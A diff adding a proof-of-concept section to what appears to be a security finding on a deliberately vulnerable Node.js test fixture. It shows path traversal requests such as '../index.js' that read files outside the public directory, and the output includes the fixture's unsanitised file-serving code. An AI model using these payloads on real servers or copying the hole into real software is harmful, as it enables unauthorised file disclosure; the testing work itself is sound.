@@ -95,3 +95,105 @@ kind = "not_found"
 source = "index.js:8-14"
 guarantee = "no sanitization of name parameter in parseRequest"
 ```
+
+---
+
+## PoC Attempt
+
+**Result**: POC_PASS
+**Date**: 2026-09-23
+**PoC by**: claude-haiku-4-5, default
+**Method**: HTTP server with curl requests
+**Test Commands**: curl requests to demonstrate path traversal
+
+### Demonstration
+
+The path traversal vulnerability was successfully demonstrated by running the Node.js server on port 3123 and sending HTTP requests with path traversal payloads. Three concrete attacks were executed:
+
+1. **Normal request (baseline)**: `GET /file?name=hello.txt` returned the expected content from `public/hello.txt` with HTTP 200
+2. **Path traversal to source code**: `GET /file?name=../index.js` successfully read and returned the entire `index.js` source code with HTTP 200, demonstrating information disclosure of application source
+3. **Path traversal to package metadata**: `GET /file?name=../package.json` successfully read and returned the package.json configuration file with HTTP 200
+
+The vulnerability is confirmed: the `name` query parameter is passed directly to `path.join(publicDir, name)` without validation, allowing `../` sequences to escape the intended `public/` directory boundary and read arbitrary files accessible to the Node.js process.
+
+### Test Output
+
+```
+=== Test 1: Normal request for hello.txt ===
+Hello from the public directory.
+status=200
+
+=== Test 2: Path traversal to read index.js ===
+import { createServer } from "node:http";
+import { readFile } from "node:fs/promises";
+import { join } from "node:path";
+
+const port = Number(process.env.PORT || 3000);
+const publicDir = join(process.cwd(), "public");
+
+function parseRequest(rawUrl) {
+  const { pathname, searchParams } = new URL(rawUrl, "http://localhost");
+
+  if (pathname === "/") return { route: "root" };
+  if (pathname === "/file") return { route: "file", name: searchParams.get("name") || "hello.txt" };
+  return { route: "not-found" };
+}
+
+function buildGreeting(route) {
+  return route === "root" ? "Hello, world!\n" : "Not found\n";
+}
+
+function sendGreeting(response, body) {
+  const statusCode = body === "Hello, world!\n" ? 200 : 404;
+
+  response.writeHead(statusCode, { "content-type": "text/plain; charset=utf-8" });
+  response.end(body);
+}
+
+async function sendFile(response, name) {
+  try {
+    const body = await readFile(join(publicDir, name));
+
+    response.writeHead(200, { "content-type": "text/plain; charset=utf-8" });
+    response.end(body);
+  } catch {
+    sendGreeting(response, "Not found\n");
+  }
+}
+
+function requestListener(request, response) {
+  const parsed = parseRequest(request.url);
+
+  if (parsed.route === "file") return sendFile(response, parsed.name);
+
+  sendGreeting(response, buildGreeting(parsed.route));
+}
+
+const server = createServer(requestListener);
+
+server.listen(port, () => {
+  console.log(`Hello-world fixture listening on http://localhost:${port}`);
+});
+
+status=200
+
+=== Test 3: Path traversal to read package.json ===
+{
+  "name": "hello-world-codeql-fixture",
+  "version": "1.0.0",
+  "private": true,
+  "type": "module",
+  "description": "Minimal local JavaScript fixture for CodeQL analysis.",
+  "scripts": {
+    "start": "node index.js",
+    "check": "node --check index.js"
+  },
+  "engines": {
+    "node": ">=18"
+  }
+}
+
+status=200
+```
+
+All requests successfully read files outside the `public/` directory, confirming the path traversal vulnerability.
